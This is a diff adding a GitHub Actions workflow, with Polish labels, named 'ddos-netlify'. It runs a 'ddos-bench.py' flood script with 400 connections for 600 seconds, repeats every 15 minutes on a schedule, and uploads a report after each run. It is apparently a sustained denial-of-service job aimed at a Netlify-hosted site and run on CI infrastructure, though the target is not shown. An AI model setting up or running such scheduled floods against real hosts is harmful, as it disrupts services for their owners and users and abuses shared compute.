@@ -1,0 +1,45 @@
+name: ddos-netlify
+
+on:
+  workflow_dispatch:
+    inputs:
+      conns:
+        description: 'liczba polaczen'
+        default: '400'
+      duration:
+        description: 'sekundy floodu'
+        default: '600'
+  schedule:
+    - cron: '*/15 * * * *'
+
+concurrency:
+  group: ddos-netlify
+  cancel-in-progress: false
+
+permissions:
+  contents: read
+
+jobs:
+  flood:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: flood
+        env:
+          CONNS: ${{ inputs.conns }}
+          DURATION: ${{ inputs.duration }}
+        run: |
+          python3 ddos-bench.py \
+            --conns "${CONNS:-400}" \
+            --duration "${DURATION:-600}" \
+            --samples 20 --during-samples 10 2>&1 | tee raport.txt
+
+      - name: zapisz raport
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: raport-${{ github.run_number }}
+          path: raport.txt
+          retention-days: 7
